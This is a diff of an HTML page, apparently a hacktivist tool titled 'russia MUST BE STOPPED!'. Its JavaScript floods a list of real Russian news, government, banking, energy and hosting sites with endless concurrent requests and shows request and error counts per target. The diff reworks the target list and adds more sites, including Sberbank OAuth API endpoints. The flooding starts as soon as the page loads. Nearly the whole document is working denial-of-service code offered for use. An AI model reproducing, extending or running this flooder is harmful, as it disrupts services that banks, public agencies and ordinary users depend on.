@@ -1,3 +1,5 @@
+
+
 <head>
   <meta charset="utf-8" />
   <title>russia MUST BE STOPPED!</title>
@@ -42,85 +44,88 @@
     </tr>
    </table>
    <div id="stats"></div>
- 
+
 <script>
-var targets = {
-  'https://lenta.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://ria.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://ria.ru/lenta/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.rbc.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.rt.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'http://kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'http://en.kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://smotrim.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://tass.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://tvzvezda.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://vsoloviev.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.1tv.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.vesti.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://online.sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://zakupki.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://er.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.rzd.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://rzdlog.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://vgtrk.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.interfax.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.mos.ru/uslugi/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'http://government.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://mil.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.nalog.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://customs.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://pfr.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://rkn.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.gazprombank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.vtb.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.gazprom.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://lukoil.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://magnit.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.nornickel.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.surgutneftegas.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.tatneft.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.evraz.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://nlmk.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.sibur.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.severstal.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.metalloinvest.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://nangs.org/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://rmk-group.ru/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.tmk-group.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://ya.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.polymetalinternational.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.uralkali.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://www.eurosib.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://ugmk.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://omk.ru/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-  'https://stack-kazan.net/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-  'https://dc.itpark-kazan.ru': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-  'https://serverinsys.com': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-  'https://optibit.ru': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-  'https://krs.system-projects.ru': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-  'https://profitserver.ru/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-  'https://1tv.com/': { number_of_requests: 0, number_of_errored_responses: 0 },  
-  'https://1prime.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://ldiena.lt/': { number_of_requests: 0, number_of_errored_responses: 0 },  
-  'https://tnt-online.ru/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-  'https://ldpr.ru/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-  'https://spravedlivo.ru/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-  'https://aeroflot.ru/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-  'https://gazeta.ru/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
-}
- 
+var targets = [
+  'https://lenta.ru/',
+  'https://ria.ru/',
+  'https://ria.ru/lenta/',
+  'https://www.rbc.ru/',
+  'https://www.rt.com/',
+  'http://kremlin.ru/',
+  'http://en.kremlin.ru/',
+  'https://smotrim.ru/',
+  'https://tass.ru/',
+  'https://tvzvezda.ru/',
+  'https://vsoloviev.ru/',
+  'https://www.1tv.ru/',
+  'https://www.vesti.ru/',
+  'https://online.sberbank.ru/',
+  'https://sberbank.ru/',
+  'https://zakupki.gov.ru/',
+  'https://www.gosuslugi.ru/',
+  'https://er.ru/',
+  'https://www.rzd.ru/',
+  'https://rzdlog.ru/',
+  'https://vgtrk.ru/',
+  'https://www.interfax.ru/',
+  'https://www.mos.ru/uslugi/',
+  'http://government.ru/',
+  'https://mil.ru/',
+  'https://www.nalog.gov.ru/',
+  'https://customs.gov.ru/',
+  'https://pfr.gov.ru/',
+  'https://rkn.gov.ru/',
+  'https://www.gazprombank.ru/',
+  'https://www.vtb.ru/',
+  'https://www.gazprom.ru/',
+  'https://lukoil.ru',
+  'https://magnit.ru/',
+  'https://www.nornickel.com/',
+  'https://www.surgutneftegas.ru/',
+  'https://www.tatneft.ru/',
+  'https://www.evraz.com/ru/',
+  'https://nlmk.com/',
+  'https://www.sibur.ru/',
+  'https://www.severstal.com/',
+  'https://www.metalloinvest.com/',
+  'https://nangs.org/',
+  'https://rmk-group.ru/ru/',
+  'https://www.tmk-group.ru/',
+  'https://ya.ru/',
+  'https://www.polymetalinternational.com/ru/',
+  'https://www.uralkali.com/ru/',
+  'https://www.eurosib.ru/',
+  'https://omk.ru/',
+  'https://mail.rkn.gov.ru/',
+  'https://cloud.rkn.gov.ru/',
+  'https://mvd.gov.ru/',
+  'https://pwd.wto.economy.gov.ru/',
+  'https://stroi.gov.ru/',
+  'https://proverki.gov.ru/',
+  'https://www.gazeta.ru/',
+  'https://www.crimea.kp.ru/',
+  'https://www.kommersant.ru/',
+  'https://riafan.ru/',
+  'https://www.mk.ru/',
+  'https://api.sberbank.ru/prod/tokens/v2/oauth',
+  'https://api.sberbank.ru/prod/tokens/v2/oidc',
+]
+
+var targetStats = {}
+targets.forEach((target) => {
+  targetStats[target] = { number_of_requests: 0, number_of_errored_responses: 0 }
+})
+
 var statsEl = document.getElementById('stats');
 function printStats() {
-  statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
+  statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targetStats).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
 }
 setInterval(printStats, 1000);
- 
+
 var CONCURRENCY_LIMIT = 1000
 var queue = []
- 
+
 async function fetchWithTimeout(resource, options) {
   const controller = new AbortController();
   const id = setTimeout(() => controller.abort(), options.timeout);
@@ -136,7 +141,7 @@ async function fetchWithTimeout(resource, options) {
     throw error;
   });
 }
- 
+
 async function flood(target) {
   for (var i = 0;; ++i) {
     if (queue.length > CONCURRENCY_LIMIT) {
@@ -149,20 +154,21 @@ async function flood(target) {
           if (error.code === 20 /* ABORT */) {
             return;
           }
-          targets[target].number_of_errored_responses++;
+          targetStats[target].number_of_errored_responses++;
         })
         .then((response) => {
           if (response && !response.ok) {
-            targets[target].number_of_errored_responses++;
+            targetStats[target].number_of_errored_responses++;
           }
-          targets[target].number_of_requests++;
+          targetStats[target].number_of_requests++;
         })
- 
+
     )
   }
 }
- 
+
 // Start
-Object.keys(targets).map(flood)
+targets.map(flood)
 </script>
 </body>
+    
